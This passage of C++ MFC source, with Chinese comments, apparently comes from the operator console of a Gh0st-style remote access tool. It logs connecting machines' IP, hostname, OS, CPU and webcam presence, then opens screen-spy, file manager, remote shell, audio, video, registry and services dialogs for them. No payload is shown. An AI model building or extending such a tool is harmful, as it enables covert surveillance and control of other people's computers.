	CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)lParam;         //注意这里的  ClientContext  正是发送数据时从列表里取出的数据

	if (ContextObject == NULL)
	{
		return -1;
	}

	CString	strToolTipsText;
	try
	{

		// 不合法的数据包
		if (ContextObject->InDeCompressedBuffer.GetBufferLength() != sizeof(LOGIN_INFOR))
		{
			return -1;
		}

		LOGIN_INFOR*	LoginInfor = (LOGIN_INFOR*)ContextObject->InDeCompressedBuffer.GetBuffer();



		sockaddr_in  ClientAddr;
		memset(&ClientAddr, 0, sizeof(ClientAddr));
		int iClientAddrLen = sizeof(sockaddr_in);
		BOOL bOk = getpeername(ContextObject->sClientSocket,(SOCKADDR*)&ClientAddr, &iClientAddrLen);  //IP C   <---IP

	

		strIP = inet_ntoa(ClientAddr.sin_addr);

	

		//主机名称
		strPCName = LoginInfor->szPCName;
		
		switch (LoginInfor->OsVerInfoEx.dwPlatformId)
		{

		case VER_PLATFORM_WIN32_NT:
			if (LoginInfor->OsVerInfoEx.dwMajorVersion <= 4 )
				strOS = "WindowsNT";
			if ( LoginInfor->OsVerInfoEx.dwMajorVersion == 5 && LoginInfor->OsVerInfoEx.dwMinorVersion == 0 )
				strOS = "Windows2000";
			if ( LoginInfor->OsVerInfoEx.dwMajorVersion == 5 && LoginInfor->OsVerInfoEx.dwMinorVersion == 1 )
				strOS = "WindowsXP";
			if ( LoginInfor->OsVerInfoEx.dwMajorVersion == 5 && LoginInfor->OsVerInfoEx.dwMinorVersion == 2 )
				strOS = "Windows2003";
			if ( LoginInfor->OsVerInfoEx.dwMajorVersion == 6 && LoginInfor->OsVerInfoEx.dwMinorVersion == 0 )
				strOS = "WindowsVista"; 
			if ( LoginInfor->OsVerInfoEx.dwMajorVersion == 6 && LoginInfor->OsVerInfoEx.dwMinorVersion == 1 )
				strOS = "Windows7";
			if ( LoginInfor->OsVerInfoEx.dwMajorVersion == 6 && LoginInfor->OsVerInfoEx.dwMinorVersion == 2 )
				strOS = "Windows8";
		}

		//CPU
		strCPU.Format("%dMHz", LoginInfor->dwCPUMHz);

		//网速
		strPing.Format("%d", LoginInfor->dwSpeed);



		strVideo = LoginInfor->bWebCamIsExist ? "有" : "无";

	

		AddList(strIP,strAddr,strPCName,strOS,strCPU,strVideo,strPing,ContextObject);  
	}catch(...){}




}
LRESULT CMy2015RemoteDlg::OnOpenScreenSpyDialog(WPARAM wParam, LPARAM lParam)
{

	//MessageBox("远程控制");
	
	CONTEXT_OBJECT *ContextObject = (CONTEXT_OBJECT*)lParam;


	CScreenSpyDlg	*Dlg = new CScreenSpyDlg(this,m_iocpServer, ContextObject);   //Send  s
	// 设置父窗口为卓面
	Dlg->Create(IDD_DIALOG_SCREEN_SPY, GetDesktopWindow());
	Dlg->ShowWindow(SW_SHOW);

	
	ContextObject->v1   = SCREENSPY_DLG;
	ContextObject->hDlg = Dlg;




	
	return 0;
}

LRESULT CMy2015RemoteDlg::OnOpenFileManagerDialog(WPARAM wParam, LPARAM lParam)
{


	CONTEXT_OBJECT *ContextObject = (CONTEXT_OBJECT*)lParam;

	//转到CFileManagerDlg  构造函数
	CFileManagerDlg	*Dlg = new CFileManagerDlg(this,m_iocpServer, ContextObject);
	// 设置父窗口为卓面
	Dlg->Create(IDD_DIALOG_FILE_MANAGER, GetDesktopWindow());    //创建非阻塞的Dlg
	Dlg->ShowWindow(SW_SHOW);

	ContextObject->v1   = FILEMANAGER_DLG;
	ContextObject->hDlg = Dlg;

	return 0;
}
LRESULT CMy2015RemoteDlg::OnOpenTalkDialog(WPARAM wParam, LPARAM lParam)
{
	CONTEXT_OBJECT *ContextObject = (CONTEXT_OBJECT*)lParam;

	//转到CFileManagerDlg  构造函数
	CTalkDlg	*Dlg = new CTalkDlg(this,m_iocpServer, ContextObject);
	// 设置父窗口为卓面
	Dlg->Create(IDD_DIALOG_TALK, GetDesktopWindow());    //创建非阻塞的Dlg
	Dlg->ShowWindow(SW_SHOW);

	ContextObject->v1   = TALK_DLG;
	ContextObject->hDlg = Dlg;

	return 0;
}

LRESULT CMy2015RemoteDlg::OnOpenShellDialog(WPARAM wParam, LPARAM lParam)
{
	CONTEXT_OBJECT *ContextObject = (CONTEXT_OBJECT*)lParam;

	//转到CFileManagerDlg  构造函数
	CShellDlg	*Dlg = new CShellDlg(this,m_iocpServer, ContextObject);
	// 设置父窗口为卓面
	Dlg->Create(IDD_DIALOG_SHELL, GetDesktopWindow());    //创建非阻塞的Dlg
	Dlg->ShowWindow(SW_SHOW);

	ContextObject->v1   = SHELL_DLG;
	ContextObject->hDlg = Dlg;

	return 0;
}


LRESULT CMy2015RemoteDlg::OnOpenSystemDialog(WPARAM wParam, LPARAM lParam)
{
	CONTEXT_OBJECT *ContextObject = (CONTEXT_OBJECT*)lParam;

	//转到CFileManagerDlg  构造函数
	CSystemDlg	*Dlg = new CSystemDlg(this,m_iocpServer, ContextObject);
	// 设置父窗口为卓面
	Dlg->Create(IDD_DIALOG_SYSTEM, GetDesktopWindow());    //创建非阻塞的Dlg
	Dlg->ShowWindow(SW_SHOW);

	ContextObject->v1   = SYSTEM_DLG;
	ContextObject->hDlg = Dlg;

	return 0;
}



LRESULT CMy2015RemoteDlg::OnOpenAudioDialog(WPARAM wParam, LPARAM lParam)
{
	CONTEXT_OBJECT *ContextObject = (CONTEXT_OBJECT*)lParam;

	//转到CFileManagerDlg  构造函数
	CAudioDlg	*Dlg = new CAudioDlg(this,m_iocpServer, ContextObject);
	// 设置父窗口为卓面
	Dlg->Create(IDD_DIALOG_AUDIO, GetDesktopWindow());    //创建非阻塞的Dlg
	Dlg->ShowWindow(SW_SHOW);

	ContextObject->v1   = AUDIO_DLG;
	ContextObject->hDlg = Dlg;

	return 0;
}

LRESULT CMy2015RemoteDlg::OnOpenServicesDialog(WPARAM wParam, LPARAM lParam)
{
	CONTEXT_OBJECT *ContextObject = (CONTEXT_OBJECT*)lParam;

	//转到CFileManagerDlg  构造函数
	CServicesDlg	*Dlg = new CServicesDlg(this,m_iocpServer, ContextObject);
	// 设置父窗口为卓面
	Dlg->Create(IDD_DIALOG_SERVICES, GetDesktopWindow());    //创建非阻塞的Dlg
	Dlg->ShowWindow(SW_SHOW);

	ContextObject->v1   = SERVICES_DLG;
	ContextObject->hDlg = Dlg;

	return 0;
}

LRESULT CMy2015RemoteDlg::OnOpenRegisterDialog(WPARAM wParam, LPARAM lParam)
{
	CONTEXT_OBJECT *ContextObject = (CONTEXT_OBJECT*)lParam;

	//转到CFileManagerDlg  构造函数
	CRegisterDlg	*Dlg = new CRegisterDlg(this,m_iocpServer, ContextObject);
	// 设置父窗口为卓面
	Dlg->Create(IDD_DIALOG_REGISTER, GetDesktopWindow());    //创建非阻塞的Dlg
	Dlg->ShowWindow(SW_SHOW);

	ContextObject->v1   = REGISTER_DLG;
	ContextObject->hDlg = Dlg;

	return 0;
}

LRESULT CMy2015RemoteDlg::OnOpenVideoDialog(WPARAM wParam, LPARAM lParam)
{
	CONTEXT_OBJECT *ContextObject = (CONTEXT_OBJECT*)lParam;

	//转到CFileManagerDlg  构造函数
	CVideoDlg	*Dlg = new CVideoDlg(this,m_iocpServer, ContextObject);
	// 设置父窗口为卓面
	Dlg->Create(IDD_DIALOG_VIDEO, GetDesktopWindow());    //创建非阻塞的Dlg
	Dlg->ShowWindow(SW_SHOW);

	ContextObject->v1   = VIDEO_DLG;
	ContextObject->hDlg = Dlg;

	return 0;
}

